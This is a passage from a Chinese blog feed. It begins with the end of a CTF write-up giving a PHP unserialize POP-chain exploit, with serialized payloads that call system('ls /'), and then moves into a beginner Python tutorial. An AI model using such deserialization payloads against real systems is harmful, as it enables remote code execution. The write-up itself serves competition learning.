class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// die($this-&gt;a);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="keyword">new</span> E(<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> A());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t1</span>,<span class="variable">$t2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $s1 = $this-&gt;b;</span></span><br><span class="line">        <span class="comment">// $s1();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="number">1</span>] = <span class="keyword">new</span> E(<span class="keyword">new</span> C(),<span class="string">&#x27;&#x27;</span>);;</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>将结果和payload1合在一起：<br>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;i:1;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;D&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;F&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;var_dump(`ls`);system&quot;;s:1:&quot;b&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;&#125;s:1:&quot;b&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>之后再利用readflag读取就好了</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>n^3ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>浅学亿下python</title>
    <url>/2022/02/13/%E6%B5%85%E5%AD%A6%E4%BA%BF%E4%B8%8Bpython/</url>
    <content><![CDATA[<h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><h3 id="1-python"><a href="#1-python" class="headerlink" title="1. python"></a>1. python</h3><p>1.cmd（命令提示符）中输入python，进行程序编写</p>
<p>2.声明一个python文件，然后在该目录下<code>python xx.py</code>执行python文件</p>
<p>3.pycharm编译</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h5 id="0x01-pycharm以及注释"><a href="#0x01-pycharm以及注释" class="headerlink" title="0x01: pycharm以及注释"></a>0x01: pycharm以及注释</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x02-数据类型"><a href="#0x02-数据类型" class="headerlink" title="0x02: 数据类型"></a>0x02: 数据类型</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询变量数据类型</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字（int、float、complex、bool）</span><br><span class="line"></span><br><span class="line">字符串（str）</span><br><span class="line"></span><br><span class="line">字典（dict）</span><br><span class="line">a = &#123;&#125;</span><br><span class="line"></span><br><span class="line">元组（Tuple）</span><br><span class="line">b = ()</span><br><span class="line"></span><br><span class="line">列表（list）</span><br><span class="line">c = []</span><br></pre></td></tr></table></figure>

<p>变量命名规则和c差不多</p>
<p>命名规范</p>
<h5 id="0x03-python基本运算符"><a href="#0x03-python基本运算符" class="headerlink" title="0x03:python基本运算符"></a>0x03:python基本运算符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">算术运算符：</span><br><span class="line">+ - * / % ** </span><br><span class="line">地板除：//</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比较运算符：</span><br><span class="line">== &lt; &gt; &lt;= &gt;= !=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#逻辑运算符：</span><br><span class="line">#and or not</span><br><span class="line">and 条件必须都为true返回true</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优先级：</span><br><span class="line">()-&gt;not-&gt;and-&gt;or</span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h5><h5 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h5><p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = &#x27;张三&#x27;</span><br><span class="line">sex = &#x27;male&#x27;</span><br><span class="line">print(&#x27;我的名字是%s，是%s&#x27;%(name,sex))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式化输出；</span><br><span class="line">使用 format</span><br><span class="line">name = &#x27;yuer&#x27;</span><br><span class="line">print(&#x27;name:&#123;&#125;&#x27;.format(name))</span><br></pre></td></tr></table></figure>

<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = input(&#x27;pleast input your name:&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="2-判断语句与循环控制"><a href="#2-判断语句与循环控制" class="headerlink" title="2.判断语句与循环控制"></a>2.判断语句与循环控制</h3><h5 id="0x01-if-else语句"><a href="#0x01-if-else语句" class="headerlink" title="0x01:if-else语句"></a>0x01:if-else语句</h5><p>流程：计算机执行代码的顺序</p>
<p>流程控制：对计算机执行代码顺序的管理，只有流程控制才能实现在开发当中的业务逻辑</p>
<p>流程控制分类：顺序流程、选择（分支）流程、循环流程</p>
<p>选择流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双分支：</span><br><span class="line">if 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">else:</span><br><span class="line">    ………………</span><br><span class="line"></span><br><span class="line">多分支：</span><br><span class="line">if 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">elif 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">else:</span><br><span class="line">    ………………</span><br></pre></td></tr></table></figure>

<p>条件表达式：比较运算符/逻辑运算符/复合运算符</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int(input(&quot;请输入数字：&quot;))</span><br><span class="line">if a &gt;= 1:</span><br><span class="line">	print(&quot;true&quot;)</span><br><span class="line">elif a == 0:</span><br><span class="line">	print(&quot;false&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;a little true&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="0x02-while循环"><a href="#0x02-while循环" class="headerlink" title="0x02:while循环"></a><strong>0x02:while循环</strong></h5><p>循环流程·：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while 条件表达式:</span><br><span class="line">	逻辑代码</span><br><span class="line">	</span><br><span class="line">for ... in 可迭代集合对象:</span><br><span class="line">	逻辑代码</span><br></pre></td></tr></table></figure>

<p><strong>while语法特点：</strong></p>
<p>1.循环必须有一个初始值</p>
<p>2.必须有条件表达式</p>
<p>3.要有自增或自减变量，否则会死循环</p>
<p>4.循环次数不确定，依靠循环条件结束</p>
<p>5.主要用于判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while true:</span><br><span class="line">	python代码段</span><br></pre></td></tr></table></figure>

<h5 id="0x03-for循环"><a href="#0x03-for循环" class="headerlink" title="0x03:for循环"></a><strong>0x03:for循环</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">for 临时变量 in 字符串、列表等:</span><br><span class="line">	执行代码</span><br><span class="line">	……</span><br></pre></td></tr></table></figure>

<p>语法特点：</p>
<p>1.遍历操作，依次地取集合容器中的每个值</p>
<p>适用于已知的循环次数（可迭代对象的遍历</p>
<p>eg：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tags=<span class="string">&#x27;abcdefg&#x27;</span>  <span class="comment">#字符串类型本身就是一个字符类型的集合</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> tags:</span><br><span class="line">	<span class="built_in">print</span>(item)</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>range函数</code> 此函数可以生成一个数据集合列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">range函数使用：</span><br><span class="line">range(起始值:结束:步长) 步长不能为0</span><br><span class="line">range(1,100,1)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p><u>for—else</u></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k = key</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> i == k:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;未找到key&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">username = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    zh = <span class="built_in">input</span>(<span class="string">&quot;账号：&quot;</span>)</span><br><span class="line">    pd = <span class="built_in">input</span>(<span class="string">&quot;密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> zh == username <span class="keyword">and</span> pd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;账号或者密码错误，请重新登录&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-break、continue"><a href="#0x04-break、continue" class="headerlink" title="0x04:break、continue"></a><strong>0x04:break、continue</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break退出循环</span><br><span class="line">continue跳过本次循环，继续下一次循环</span><br></pre></td></tr></table></figure>

<h3 id="3-高级数据类型"><a href="#3-高级数据类型" class="headerlink" title="3.高级数据类型"></a>3.高级数据类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列：一组按照顺序排序的值（数据集合</span><br><span class="line">在python中存在三种内置的序列类型：字符串、列表、元组</span><br><span class="line"></span><br><span class="line">优点：可以支持索引和切片的操作</span><br><span class="line">特征：第一个正索引为0，指向的是左端，第一个索引为负数的时候，指向的是右端</span><br><span class="line"></span><br><span class="line">#切片是指截取字符串中的任意一段内容。</span><br><span class="line">#使用方法：[起始下标:介绍下标:步长]切片截取的内容不包含结束下标对应的数据，步长指的是隔几个下标获取一个字符</span><br><span class="line"></span><br><span class="line">下标会越界，切片不会</span><br></pre></td></tr></table></figure>

<h5 id="0x01-字符串"><a href="#0x01-字符串" class="headerlink" title="0x01:字符串"></a>0x01:字符串</h5><p><strong>常用方法：</strong></p>
<table>
<thead>
<tr>
<th align="center">capitalize()</th>
<th align="center">首字母变大写</th>
</tr>
</thead>
<tbody><tr>
<td align="center">endswith()/startswith()</td>
<td align="center">是否-&gt;结束/开始</td>
</tr>
<tr>
<td align="center">id()</td>
<td align="center">查看变量内存地址</td>
</tr>
<tr>
<td align="center">find()</td>
<td align="center">检测x是否在字符串中</td>
</tr>
<tr>
<td align="center">index()</td>
<td align="center">检测x是否在字符串中</td>
</tr>
<tr>
<td align="center">isalnum()</td>
<td align="center">判断是否是字母和数字</td>
</tr>
<tr>
<td align="center">isalpha()</td>
<td align="center">判断是否是字母</td>
</tr>
<tr>
<td align="center">isdigit()</td>
<td align="center">判断是否是数字</td>
</tr>
<tr>
<td align="center">islower()</td>
<td align="center">判断是否是小写</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">循环取出所有值得用xx去连接</td>
</tr>
<tr>
<td align="center">lower()/upper()</td>
<td align="center">大小写转换</td>
</tr>
<tr>
<td align="center">swapcase()</td>
<td align="center">大写变小写，小写变大写</td>
</tr>
<tr>
<td align="center">lstrip()/rstrip()/strip()</td>
<td align="center">移除左/右/两侧空白</td>
</tr>
<tr>
<td align="center">split()</td>
<td align="center">切割字符串</td>
</tr>
<tr>
<td align="center">title()</td>
<td align="center">把每个单词的首字母变成大写</td>
</tr>
<tr>
<td align="center">replace(old,new,count=None)</td>
<td align="center">替换字符，count为替换个数，无count表示全部替换</td>
</tr>
<tr>
<td align="center">count()</td>
<td align="center">统计出现的次数</td>
</tr>
</tbody></table>
<h6 id="1-常用方法使用"><a href="#1-常用方法使用" class="headerlink" title="1.常用方法使用"></a>1.常用方法使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#capitalize()</span></span><br><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name.capitalize()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is %s&quot;</span>%name.capitalize())</span><br><span class="line"></span><br><span class="line"><span class="comment">#strip()</span></span><br><span class="line">a = <span class="string">&#x27;  yuer  &#x27;</span></span><br><span class="line">b = a.strip()</span><br><span class="line">c = a.lstrip()</span><br><span class="line">d = a.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="comment">#id()</span></span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = a <span class="comment">#对内存地址进行复制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#find()  index()</span></span><br><span class="line"><span class="comment">#find如果没有找到就返回-1</span></span><br><span class="line"><span class="comment">#find如果没有找到就会报错</span></span><br><span class="line">a = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&#x27;o&#x27;</span>))     <span class="comment">#1 第一次出现的下标，下标从0开始</span></span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#startswith() endswith()</span></span><br><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&#x27;y&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(a.endswith(<span class="string">&#x27;r&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lower()/upper()</span></span><br><span class="line"><span class="comment">#对全体进行操作</span></span><br><span class="line">a = <span class="string">&#x27;CooKie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br><span class="line"><span class="built_in">print</span>(a.upper())</span><br></pre></td></tr></table></figure>

<h6 id="2-切片操作"><a href="#2-切片操作" class="headerlink" title="2.切片操作"></a>2.切片操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;we need a pwner&#x27;</span></span><br><span class="line"><span class="comment"># slice [start:end:step]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>) <span class="comment">#输出完整数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>]) <span class="comment">#某个数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:<span class="number">6</span>])  <span class="comment"># nee 结束点不被包含 左闭右开</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:])  <span class="comment">#取到最后</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[:<span class="number">2</span>])  <span class="comment">#取前两位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>]) <span class="comment">#倒序输出 负号表示方向，从右边往左遍历</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-列表"><a href="#0x02-列表" class="headerlink" title="0x02:列表"></a>0x02:列表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序的数据集合</span><br><span class="line">1.可以随时添加、删除和修改</span><br><span class="line">2.数据是可以变化的（数据项可以变化，但地址不会改变</span><br><span class="line">3.用[]表示列表类型，数据项之间用逗号分隔，注意：数据项可以是任何类型的数据</span><br><span class="line">4.支持索引和切片来进行操作</span><br><span class="line"></span><br><span class="line">用for循环可对列表进行遍历</span><br></pre></td></tr></table></figure>

<p>列表定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li = []</span><br><span class="line">print(type(li))</span><br></pre></td></tr></table></figure>

<p>方法：</p>
<table>
<thead>
<tr>
<th>append</th>
<th>在列表后面追加元素</th>
</tr>
</thead>
<tbody><tr>
<td>len</td>
<td>输出列表中元素个数</td>
</tr>
<tr>
<td>count</td>
<td>统计元素出现的次数</td>
</tr>
<tr>
<td>extend</td>
<td>扩展，相当于批量添加</td>
</tr>
<tr>
<td>index</td>
<td>获取指定元素索引号</td>
</tr>
<tr>
<td>insert</td>
<td>在指定位置插入</td>
</tr>
<tr>
<td>pop</td>
<td>删除最后一个元素</td>
</tr>
<tr>
<td>remove</td>
<td>移除左边找到的第一个元素</td>
</tr>
<tr>
<td>reverse</td>
<td>反转列表</td>
</tr>
<tr>
<td>sort</td>
<td>列表排序</td>
</tr>
</tbody></table>
<h6 id="1-常用方法使用-1"><a href="#1-常用方法使用-1" class="headerlink" title="1.常用方法使用"></a>1.常用方法使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找 支持切片</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(li)  <span class="comment">#输出完成的列表</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">0</span>]) <span class="comment">#输出第一个元素</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#输出第二个到第四个元素</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">2</span>:]) <span class="comment">#第三个元素到最后</span></span><br><span class="line"><span class="built_in">print</span>(li[::-<span class="number">1</span>])  <span class="comment">#倒序输出</span></span><br><span class="line"><span class="built_in">print</span>(li*<span class="number">2</span>)  <span class="comment">#多次输出列表中的元素</span></span><br><span class="line"><span class="built_in">print</span>(li.index(<span class="number">20</span>))  <span class="comment">#返回查找元素的下标</span></span><br><span class="line"><span class="built_in">print</span>(li.index())</span><br><span class="line"><span class="comment"># index(元素,start,end)  start和end都是下标值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加 append() insert() extend()</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li.append([<span class="string">&#x27;yer&#x27;</span>])  <span class="comment">#追加的是列表</span></span><br><span class="line">li.append(<span class="string">&#x27;111&#x27;</span>) <span class="comment">#追加元素的时候只能追加一个</span></span><br><span class="line">li.insert(<span class="number">1</span>,<span class="string">&#x27;插入数据&#x27;</span>)  <span class="comment">#在指定位置插入元素</span></span><br><span class="line">d = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">11</span>))  <span class="comment">#强制转换为list对象</span></span><br><span class="line">li.extend(d) <span class="comment">#扩展可以将其他列表中的元素增加到进行操作的列表之中 批量增加</span></span><br><span class="line">li.extend([<span class="string">&#x27;123&#x27;</span>,<span class="number">234</span>,<span class="string">&#x27;dc&#x27;</span>]) <span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改  </span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li[<span class="number">0</span>] = <span class="string">&#x27;tom&#x27;</span> <span class="comment">#可以直接修改 数据类型没有要求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除 pop() del remove()</span></span><br><span class="line">li2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>,<span class="number">51</span>))</span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">0</span>]  <span class="comment">#删除第一位元素</span></span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#利用切片进行批量删除元素</span></span><br><span class="line">li2.remove(<span class="number">20</span>) <span class="comment">#移除指定的元素</span></span><br><span class="line">li2.pop(<span class="number">1</span>)  <span class="comment">#移除指定下标的元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="0x03-元组"><a href="#0x03-元组" class="headerlink" title="0x03:元组"></a>0x03:元组</h5><p><strong>tuple</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">元组：是一种不可变的序列，在创建之后不能做任何的修改</span><br><span class="line">1.不可变</span><br><span class="line">2.用()创建元组类型，数据项用逗号分隔</span><br><span class="line">3.可以是任何的类型</span><br><span class="line">4.当元组中只有一个元素时，要加上逗号，不然解释器会把元组当作元素处理</span><br><span class="line">5.支持切片操作</span><br></pre></td></tr></table></figure>

<p>元组创建：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))  <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<h6 id="1-简单操作"><a href="#1-简单操作" class="headerlink" title="1.简单操作"></a>1.简单操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询==&gt;for循环 索引 切片</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])  <span class="comment">#倒叙输出 从右往左下标4相当于从左往右下标-1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a[<span class="number">3</span>])) <span class="comment">#列表 虽然元组不可修改但是可以对元组中的列表进行修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内置方法 count  统计元素在元组中出现的次数</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="string">&#x27;yuer&#x27;</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内置方法 index  查找指定元素在元组中的下标索引</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;yuer&#x27;</span>))  <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tupleA = ()  <span class="comment">#空元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line">tupleA = (<span class="string">&#x27;adcd&#x27;</span>,<span class="number">11</span>,<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line"></span><br><span class="line"><span class="comment">#两次的地址是不一样的 因为元组是不可修改的</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-字典"><a href="#0x04-字典" class="headerlink" title="0x04:字典"></a>0x04:字典</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.可以存储任意对象，以键值对的形式创建的&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;利用大括号包裹，数据项用逗号分隔</span><br><span class="line">2.字典中找某个元素时，是根据键、值字典的每个元素由2部分组成</span><br><span class="line">3.在我们不确定字典中是否存在某个键而又想获取其值的时候，可以使用get方法，还可以设置默认值</span><br><span class="line">4.字典中键不可重复，值可重复（如果有重复的键，后者会覆盖前者</span><br><span class="line">5.字典的键只能是不可变类型：数字、字符串、元组等</span><br><span class="line">6.不是序列类型，没有下标概念，不能使用索引，是python内置的高级数据类型</span><br></pre></td></tr></table></figure>

<h6 id="1-常用方法"><a href="#1-常用方法" class="headerlink" title="1.常用方法"></a>1.常用方法</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建字典</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment">#增加数据 </span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;yuer&#x27;</span> <span class="comment">#   key:value</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#元素格式</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span 